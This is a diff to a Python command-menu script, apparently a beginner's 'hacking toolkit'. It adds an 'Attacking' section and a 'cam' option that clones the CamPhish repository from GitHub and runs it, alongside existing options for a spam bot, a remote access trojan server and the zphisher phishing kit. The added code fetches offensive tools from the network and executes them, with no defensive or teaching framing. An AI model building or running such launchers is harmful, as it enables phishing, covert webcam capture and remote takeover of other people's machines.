@@ -72,11 +72,18 @@ while command != "q":
     question = input(Fore.GREEN + """
 Avaible commands:
 q = quit
+
+~~~~~~~~ Networking ~~~~~~~~~~~~~
 geo = opens geolocator
 port = opens open port tester
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+~~~~~~~~ Attacking ~~~~~~~~~~~~~~
 spam = opens a spammbot
 rat = opens a remote access trojan (reverse shell) --- linux only :(
 fish = opens a phishing website maker --- linux only :(
+cam = opens a cam hacking tool --- linux only :(
+///////////////////////////////////////
 
 enter command: """)
 
@@ -119,12 +126,12 @@ enter command: """)
             time.sleep(int(speed))
 
     elif question == "rat":
-        password = input(Fore.RED + "INSTALLING THE TOOL")
+        password = input(Fore.RED + "INSTALLING THE TOOL (enter to continue): ")
         repo = "https://github.com/Simit6155/SchimmelBox-Warriors.git"
         clone_cmd = ["git", "clone", repo]
         subprocess.run(clone_cmd)
         os.chdir("SchimmelBox-Warriors")
-        print(Fore.RED + "YOU NEED TO HAVE THE CLIENT.PY RUNNING ON THE SYSTEM U WANNA CONNECT TO !!! ")
+        print(Fore.RED + "YOU NEED TO HAVE THE CLIENT.PY RUNNING ON THE SYSTEM U WANNA CONNECT TO !!! (enter to continue)")
         time.sleep(3)
         subprocess.run(["python3", "server.py"])
 
@@ -137,3 +144,13 @@ enter command: """)
         subprocess.run(mod_phish)
         start_phish = ["./zphisher.sh"]
         subprocess.run(start_phish)
+
+    elif question == "cam":
+        cam_repo = "https://github.com/techchipnet/CamPhish.git"
+        cam_clone = ["git", "clone", cam_repo]
+        subprocess.run(cam_clone)
+        os.chdir("CamPhish")
+        mod_cam = ["chmod" , "+x" , "CamPhish.sh"]
+        subprocess.run(mod_cam)
+        start_cam = ["./CamPhish.sh"]
+        subprocess.run(start_cam)
